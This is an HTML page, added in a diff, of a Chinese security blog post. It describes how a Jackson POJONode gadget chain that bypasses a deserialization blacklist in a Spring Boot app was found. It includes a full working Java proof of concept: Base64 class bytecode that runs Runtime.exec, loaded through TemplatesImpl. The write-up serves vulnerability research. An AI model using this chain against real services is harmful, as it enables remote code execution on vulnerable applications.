@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>jackson和java原生反序列化 - NoMuggle - To record my tech and my life</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="ssspallow" /><meta name="description" content="前言 在一次审计过程中发现了一处原生反序列化漏洞的点，但利用漏洞却花了很长时间，这里简要记录下。 程序是一个spring boot的应用程序，使用" /><meta name="keywords" content="security, python, node.js" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.89.4 with theme even" />
+
+
+<link rel="canonical" href="https://www.nomuggle.com/post/jackson%E5%92%8Cjava%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%92%8Cjava%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.b5a744db6de49a86cadafb3b70f555ab443f83c307a483402259e94726b045ff.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="jackson和java原生反序列化" />
+<meta property="og:description" content="前言 在一次审计过程中发现了一处原生反序列化漏洞的点，但利用漏洞却花了很长时间，这里简要记录下。 程序是一个spring boot的应用程序，使用" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.nomuggle.com/post/jackson%E5%92%8Cjava%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%92%8Cjava%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-08-10T12:20:00+08:00" />
+<meta property="article:modified_time" content="2023-08-10T12:20:00+08:00" />
+
+<meta itemprop="name" content="jackson和java原生反序列化">
+<meta itemprop="description" content="前言 在一次审计过程中发现了一处原生反序列化漏洞的点，但利用漏洞却花了很长时间，这里简要记录下。 程序是一个spring boot的应用程序，使用"><meta itemprop="datePublished" content="2023-08-10T12:20:00+08:00" />
+<meta itemprop="dateModified" content="2023-08-10T12:20:00+08:00" />
+<meta itemprop="wordCount" content="1909">
+<meta itemprop="keywords" content="java," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="jackson和java原生反序列化"/>
+<meta name="twitter:description" content="前言 在一次审计过程中发现了一处原生反序列化漏洞的点，但利用漏洞却花了很长时间，这里简要记录下。 程序是一个spring boot的应用程序，使用"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">NoMuggle</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">NoMuggle</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">jackson和java原生反序列化</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2023-08-10 </span>
+        <div class="post-category">
+            <a href="/categories/java%E5%AE%89%E5%85%A8/"> java安全 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#思路">思路</a></li>
+    <li><a href="#寻找可以绕过黑名单的gadget">寻找可以绕过黑名单的gadget</a></li>
+    <li><a href="#寻找jackson内的可序列化类">寻找Jackson内的可序列化类</a></li>
+    <li><a href="#pojonode">POJONode</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="前言">前言</h2>
+<p>在一次审计过程中发现了一处原生反序列化漏洞的点，但利用漏洞却花了很长时间，这里简要记录下。</p>
+<p>程序是一个spring boot的应用程序，使用黑名单限制了很多原生和常见第三方库的反序列化链子， 因此只能重新从依赖中寻找可用的gadget。</p>
+<p>最后从spring boot自带的Jackson中找到了一条。</p>
+<h2 id="思路">思路</h2>
+<p>我们有一个原生反序列化的api接口 -&gt;  寻找可以绕过黑名单的gadget -&gt; 寻找gadget后续的依赖链</p>
+<h2 id="寻找可以绕过黑名单的gadget">寻找可以绕过黑名单的gadget</h2>
+<p>在这一步我发现BadAttributeValueExpException这条gadget没在黑名单内， 众所周知， BadAttributeValueExpException使用toString函数
+来触发后续类，因此我们后续寻找链子需要在能用toString函数触发危险操作的类中找。（这颇有点射箭之后再画靶子的感觉在😁，但是我找链子一般是先从熟悉的开始找，
+实在找不到了再写程序批量扫）</p>
+<p>（以下是BadAttributeValueExpException的readObject方法）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+        ObjectInputStream.GetField gf = ois.readFields();
+        Object valObj = gf.get(&#34;val&#34;, null);
+
+        if (valObj == null) {
+            val = null;
+        } else if (valObj instanceof String) {
+            val= valObj;
+        } else if (System.getSecurityManager() == null
+                || valObj instanceof Long
+                || valObj instanceof Integer
+                || valObj instanceof Float
+                || valObj instanceof Double
+                || valObj instanceof Byte
+                || valObj instanceof Short
+                || valObj instanceof Boolean) {
+            val = valObj.toString();
+        } else { // the serialized object is from a version without JDK-8019292 fix
+            val = System.identityHashCode(valObj) + &#34;@&#34; + valObj.getClass().getName();
+        }
+    }
+</code></pre></td></tr></table>
+</div>
+</div><p><code>val = valObj.toString();</code> 这行即为触发点</p>
+<h2 id="寻找jackson内的可序列化类">寻找Jackson内的可序列化类</h2>
+<p>由上一步, 我们需要在依赖内找到可用的toString可序列化类。 看到toString函数加反序列化，熟悉的师傅可能会马上联想到fastjson也由toString函数
+触发原生反序列化（见https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/）。</p>
+<p>那么我们也可以很自然的想到，或许JackSon也可能存在类似的类可以触发原生反序列化。</p>
+<p>在jackson源码包内搜索<code>implements java.io.Serializable</code> 或者 <code>implements Serializable</code>, 得到的类逐一排查，找到了一个符合要求的类&ndash;POJONode</p>
+<h2 id="pojonode">POJONode</h2>
+<p>POJONode继承自抽象类ValueNode， ValueNode继承自BaseJsonNode， BaseJsonNode 有一个toString方法，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">@Override
+public String toString() {
+   return InternalNodeMapper.nodeToString(this);
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>存在一个<code>InternalNodeMapper.nodeToString</code>的方法。
+这个方法干了啥呢， 举个例子， 我们有如下这个类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">class A implements java.io.Serializable{
+    private String b;
+
+    public String getB() {
+        System.out.println(&#34;aaaaa&#34;);
+        return b;
+    }
+
+    private void readObject(){
+        System.out.println(&#34;bbbbb&#34;);
+    }
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>如果我们把它实例化并且传入POJONode中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">A aa= new A();
+POJONode pojoNode = new POJONode(aa);
+pojoNode.toString();
+</code></pre></td></tr></table>
+</div>
+</div><p>在调用<code>pojoNode.toString();</code>后，发现getB函数被调用， 猜测是POJONode toString 类是会自动调用get函数。</p>
+<p>调试一波， 在BaseJsonNode的toString函数处打个断点，逐步调试下去。
+<img src="2.png" alt=""></p>
+<p>前面都是些拿值取值的操作，一直到BeanPropertyWriter类的serializeAsField</p>
+<p><img src="3.png" alt=""></p>
+<p>看688行， 其中_accessorMethod是getB函数， bean是我们实例化的A类，在此处调用A实例的getB函数。</p>
+<p>全部调用栈如下：
+<img src="4.png" alt=""></p>
+<h1 id="执行命令">执行命令</h1>
+<p>既然能触发get方法的调用了，那么可以通过触发TemplatesImpl的getOutputProperties方法实现加载任意字节码，最终触发恶意方法调用。</p>
+<p>利用demo如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
+
+import java.io.*;
+import java.lang.reflect.AccessibleObject;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.Base64;
+
+
+public class JacksonSerialize {
+    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {
+        Field field = null;
+        try {
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(true);
+        }
+        catch (NoSuchFieldException ex) {
+            if (clazz.getSuperclass() != null)
+                field = getField(clazz.getSuperclass(), fieldName);
+        }
+        return field;
+    }
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static void main(String[] args) throws Exception {
+        byte[] code =
+                Base64.getDecoder().decode(&#34;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1&#34; +
+                        &#34;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&#34; +
+                        &#34;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUB&#34; +
+                        &#34;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUv&#34; +
+                        &#34;eGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs&#34; +
+                        &#34;L2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2Vy&#34; +
+                        &#34;aWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJj&#34; +
+                        &#34;ZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAcDAAdAB4BAARjYWxjDAAfACAB&#34; +
+                        &#34;ABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwv&#34; +
+                        &#34;eHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&#34; +
+                        &#34;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEA&#34; +
+                        &#34;EWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEA&#34; +
+                        &#34;BGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAA&#34; +
+                        &#34;AAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAAsACwAAAAQAAQAMAAEABwAN&#34; +
+                        &#34;AAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAOAAsAAAAEAAEADAABAA4ADwACAAkAAAAu&#34; +
+                        &#34;AAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABEABAASAA0AEwALAAAABAABABAA&#34; +
+                        &#34;AQARAAAAAgAS&#34;);
+        Templates templates = new TemplatesImpl();
+        setFieldValue(templates, &#34;_bytecodes&#34;, new byte[][] {code});
+        setFieldValue(templates, &#34;_name&#34;, &#34;HelloTemplatesImpl&#34;);
+        setFieldValue(templates, &#34;_tfactory&#34;, new TransformerFactoryImpl());
+
+        POJONode pojoNode = new POJONode(templates);
+        
+        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
+        Field val = Class.forName(&#34;javax.management.BadAttributeValueExpException&#34;).getDeclaredField(&#34;val&#34;);
+        val.setAccessible(true);
+        val.set(poc,pojoNode);
+        
+
+        ObjectStreamClass objectStreamClass = ObjectStreamClass.lookup(POJONode.class);
+        Field field = ObjectStreamClass.class.getDeclaredField(&#34;writeReplaceMethod&#34;);
+        field.setAccessible(true);
+        field.set(objectStreamClass, null);
+
+
+
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        new ObjectOutputStream(baos).writeObject(poc);
+        baos.flush();
+
+        FileOutputStream fos = new FileOutputStream(new File(&#34;myFile&#34;));
+        baos.writeTo(fos);
+
+
+        File file = new File(&#34;myFile&#34;);
+
+        byte[] fileBytes = new byte[(int)file.length()];
+        FileInputStream fis = new FileInputStream(file);
+        fis.read(fileBytes);
+        fis.close();
+
+        ByteArrayInputStream bais = new ByteArrayInputStream(fileBytes);
+        new ObjectInputStream(bais).readObject();
+    }
+}
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="总结">总结</h2>
+<p>通过BadAttributeValueExpException反序列化时会自动调用的toString函数， 我们找到了在JackSon内的POJONode的toString会自动调用bean的
+get方法， 通过触发TemplatesImpl的getOutputProperties方法实现加载任意字节码，最终触发恶意方法调用。</p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">ssspallow</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2023-08-10
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/java/">java</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="/post/commons-collections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/commonscollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+            <span class="next-text nav-default">Commons Collections1</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://www.nomuggle.com/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2016 - 
+    2023<span class="heart"><i class="iconfont icon-heart"></i></span><span>ssspallow</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
